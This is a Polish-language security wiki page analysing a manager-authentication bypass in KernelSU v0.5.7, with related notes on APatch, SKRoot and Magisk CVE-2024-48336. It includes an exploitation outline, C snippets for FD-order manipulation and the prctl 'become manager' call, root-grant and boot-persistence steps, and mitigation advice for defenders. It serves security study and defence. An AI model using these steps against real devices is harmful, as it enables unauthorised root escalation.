# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks takie jak KernelSU, APatch i SKRoot patchują lub hookują kernel Androida/Linuxa i udostępniają uprzywilejowane funkcje nieuprzywilejowanej aplikacji managera w userspace. Magisk omówiono osobno poniżej, ponieważ CVE-2024-48336 dotyczył ładowania kodu po stronie managera, a nie tej ścieżki syscall KernelSU.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Ta strona abstrahuje techniki i problemy ujawnione w publicznych badaniach (w szczególności analizie KernelSU v0.5.7 przeprowadzonej przez Zimperium), aby pomóc zarówno red teamom, jak i blue teamom zrozumieć attack surface, exploitation primitives oraz solidne mitigations.<sup>[[1]](#references)</sup>

---
## Wzorzec architektury: kanał managera oparty na syscall hook

- W KernelSU v0.5.7 kernel hook na `prctl` odbiera magiczną wartość, ID komendy oraz argumenty specyficzne dla komendy z userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Caller najpierw żąda statusu managera za pomocą `CMD_BECOME_MANAGER`. Autoryzacja jest specyficzna dla komendy: `CMD_GRANT_ROOT` sprawdza stan managera/allowlist, `CMD_ALLOW_SU` jest dostępne wyłącznie dla managera, a `CMD_SET_SEPOLICY` w tej wersji jest dostępne wyłącznie dla roota.<sup>[[2]](#references)[[11]](#references)</sup>
- Pozostałe komendy odpytują wersję/konfigurację albo raportują zdarzenia frameworka.<sup>[[2]](#references)</sup>
- Ponieważ każda aplikacja może wywołać ten interfejs syscall, poprawność uwierzytelniania managera ma kluczowe znaczenie.<sup>[[1]](#references)[[2]](#references)</sup>

Przykład (design KernelSU):
- Hooked syscall: prctl
- Magiczna wartość przekierowująca do handlera KernelSU: 0xDEADBEEF
- Komendy obejmują: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT itd.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## Przepływ uwierzytelniania KernelSU v0.5.7 (zgodnie z implementacją)

Gdy userspace wywołuje prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU weryfikuje:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Sprawdzenie prefiksu path
- Podany path musi zaczynać się od oczekiwanego prefiksu dla UID callera, np. /data/data/<pkg> lub /data/user/<id>/<pkg>.
- Reference: logika prefiksu path w core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Sprawdzenie ownership
- Path musi należeć do UID callera.
- Reference: logika ownership w core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) Sprawdzenie sygnatury APK przez skanowanie tabeli FD
- Iteruj po otwartych file descriptorach procesu callera w rosnącej kolejności descriptorów.
- Dla każdego regularnego pliku, którego path zaczyna się od `/data/app/` i kończy na `/base.apk`, wymagaj, aby path zawierał substring package wyprowadzony z podanego data-directory path.
- Zweryfikuj sygnaturę pierwszego kandydata spełniającego te sprawdzenia path.
- Sparsuj sygnaturę APK v2 i zweryfikuj ją względem oficjalnego certyfikatu managera.
- References: manager.c (iterowanie po FD), apk_sign.c (weryfikacja APK v2).<sup>[[3]](#references)[[4]](#references)</sup>

Jeśli wszystkie sprawdzenia zakończą się powodzeniem, kernel tymczasowo cache'uje UID managera; komendy dostępne wyłącznie dla managera akceptują następnie ten UID, podczas gdy pozostałe komendy zachowują własny UID lub własne sprawdzenia allowlist.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Klasa podatności: zaufanie do wyboru APK opartego na path

KernelSU v0.5.7 nie wiąże wyniku weryfikacji sygnatury z tożsamością zainstalowanego package w PackageManager. W `manager.c` sprawdzenie package jest wyłącznie testem substring path (`strstr(cwd, pkg)`); następnie weryfikowana jest sygnatura pierwszego kandydata spełniającego ten test. Atakujący może więc umieścić prawdziwy manager APK w path `/data/app/`, który zawiera również nazwę package atakującego, i doprowadzić do jego wybrania jako pierwszego.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

To zaufanie pośrednie pozwala nieuprzywilejowanej aplikacji podszyć się pod managera bez posiadania klucza podpisującego managera.<sup>[[1]](#references)</sup>

Kluczowe wykorzystywane właściwości:<sup>[[1]](#references)[[3]](#references)</sup>
- Skanowanie FD odbywa się według indeksu descriptorów, a sprawdzenie package jest testem substring path, a nie zweryfikowanym powiązaniem tożsamości package z APK.
- open() zwraca najniższy dostępny FD. Zamykając najpierw FD o niższych numerach, atakujący może kontrolować kolejność.
- Dołączony manager APK może zostać umieszczony w `/data/app/` w path zawierającym string package atakującego, przy zachowaniu oficjalnej sygnatury managera.

---
## Warunki wstępne ataku

Konkretny przypadek KernelSU v0.5.7 wymaga:<sup>[[1]](#references)[[3]](#references)</sup>

- Urządzenie jest już zrootowane przy użyciu podatnego rooting framework (np. KernelSU v0.5.7).
- Atakujący może lokalnie uruchamiać dowolny nieuprzywilejowany kod (proces aplikacji Android).
- W implementacji v0.5.7 `current->real_parent` musi mieć UID 0 (komentarz w source opisuje to jako wymaganie bezpośredniego dziecka zygote); `manager.c` odrzuca inne parents.<sup>[[3]](#references)</sup>
- Prawdziwy manager nie został jeszcze uwierzytelniony (np. bezpośrednio po restarcie). Niektóre frameworki cache'ują UID managera po pomyślnym uwierzytelnieniu; musisz wygrać race.<sup>[[1]](#references)</sup>

---
## Zarys exploitation (KernelSU v0.5.7)

Kroki wysokiego poziomu (cytowane demo video pokazuje public proof of concept w działaniu):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Zbuduj poprawny path do własnego katalogu danych aplikacji, aby spełnić sprawdzenia prefiksu i ownership.
2) Umieść prawdziwy KernelSU Manager base.apk w `/data/app/` w path zawierającym string package atakującego, a następnie otwórz go na FD o niższym numerze niż własny base.apk.
3) Wywołaj prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...), aby przejść sprawdzenia.
4) Użyj `CMD_GRANT_ROOT`, a następnie `CMD_ALLOW_SU` dla trwałego su; wywołuj root-only `CMD_SET_SEPOLICY` dopiero po uzyskaniu roota i tylko tam, gdzie jest wspierane.

Praktyczne uwagi dotyczące kroku 2 (kolejność FD):<sup>[[1]](#references)</sup>
- Zidentyfikuj FD własnego procesu dla własnego /data/app/*/base.apk, przechodząc po symlinkach /proc/self/fd.
- Zamknij FD o niskim numerze (np. stdin, fd 0) i otwórz najpierw prawdziwy manager APK, aby zajął fd 0 (lub dowolny indeks niższy niż FD własnego base.apk).
- Dołącz prawdziwy manager APK do swojej aplikacji, aby jego path zaczynał się od `/data/app/`, kończył na `/base.apk` i zawierał string package. Przykładowo path w katalogu `lib` aplikacji może spełnić te sprawdzenia.<sup>[[1]](#references)[[3]](#references)</sup>

Przykładowe fragmenty kodu (Android/Linux, wyłącznie ilustracyjne):

Wyliczanie otwartych FD w celu znalezienia wpisów base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Wymuś, aby FD o niższym numerze wskazywał na prawidłowy plik APK managera:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Uwierzytelnianie Managera za pośrednictwem hooka `prctl` w KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Po uzyskaniu uprawnień, uprzywilejowane commands (przykłady):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: podnieś uprawnienia bieżącego procesu do root
- CMD_ALLOW_SU: dodaj swój package/UID do allowlist dla trwałego su
- CMD_SET_SEPOLICY: dostosuj politykę SELinux po uzyskaniu root; KernelSU v0.5.7 sprawdza UID 0 dla tego commandu.<sup>[[2]](#references)</sup>

Wskazówka dotycząca race/persistence:
- Zarejestruj receiver BOOT_COMPLETED w AndroidManifest (`RECEIVE_BOOT_COMPLETED`), aby uruchamiać się po ponownym uruchomieniu i próbować uwierzytelnić się przed właściwym managerem; permission zezwala na odbieranie `ACTION_BOOT_COMPLETED`, ale sama nie gwarantuje priorytetu scheduling.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Wskazówki dotyczące wykrywania i mitigacji

Dla developerów frameworków:
- Powiąż authentication z package/UID wywołującego, a nie z arbitralnymi FD:
- Ustal package wywołującego na podstawie jego UID i zweryfikuj go względem signature zainstalowanego package (przez PackageManager), zamiast skanować FD.
- Jeśli rozwiązanie jest kernel-only, użyj stabilnej tożsamości wywołującego (task creds) i waliduj ją na stabilnym źródle prawdy zarządzanym przez init/helper w userspace, a nie przez FD procesów.
- Unikaj sprawdzania prefixów ścieżek jako tożsamości; wywołujący może je łatwo spełnić.
- Użyj challenge–response opartego na nonce przez channel i wyczyść każdą zapisaną w cache tożsamość managera podczas boot lub po kluczowych zdarzeniach.
- Jeśli to możliwe, rozważ authenticated IPC oparte na binderze zamiast przeciążać generic syscalls.

Dla defenderów/blue team:
- Wykrywaj obecność rooting frameworks i procesów managerów; monitoruj wywołania prctl z podejrzanymi magic constants (np. 0xDEADBEEF), jeśli masz telemetry z kernela.<sup>[[1]](#references)[[11]](#references)</sup>
- W zarządzanych flotach blokuj lub zgłaszaj boot receivers z niezaufanych packages, które szybko próbują wykonywać uprzywilejowane commands managera po boot.
- Upewnij się, że urządzenia mają zaktualizowane, załatane wersje frameworków; unieważniaj zapisane w cache IDs managera podczas aktualizacji.

Ograniczenia ataku:<sup>[[1]](#references)[[2]](#references)</sup>
- Dotyczy wyłącznie urządzeń, które zostały już zrootowane przy użyciu podatnego frameworka.
- Zwykle wymaga ponownego uruchomienia/race window przed uwierzytelnieniem właściwego managera (niektóre frameworki przechowują UID managera w cache aż do resetu).

---
## Powiązane uwagi dotyczące frameworków

- Authentication oparte na haśle (np. historyczne buildy APatch/SKRoot) może być słabe, jeśli hasła można odgadnąć lub złamać brute force albo walidacje zawierają błędy.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Authentication oparte na package/signature (np. KernelSU) jest z założenia silniejsze, ale musi wiązać się z rzeczywistym wywołującym, a nie z artefaktami wyprowadzonymi ze ścieżki i wybranymi przez skanowanie FD.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 dotyczyła buildów starszych niż Canary 27007, które ładowały code z niezweryfikowanego package GMS, umożliwiając lokalnej aplikacji wykonanie code w aplikacji Magisk i eskalację do root bez interakcji użytkownika.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Rootowanie całego zła: luki w zabezpieczeniach, które mogłyby zagrozić urządzeniu mobilnemu](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – sprawdzanie authentication w core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – iteracja FD, sprawdzanie package i wywołanie signature w manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – weryfikacja APK v2 w apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Projekt KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Zgłoszenie Magisk nr 8279 – weryfikacja, czy GMS jest aplikacją systemową](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Film demonstracyjny PoC KSU (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – identyfikatory commands w ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
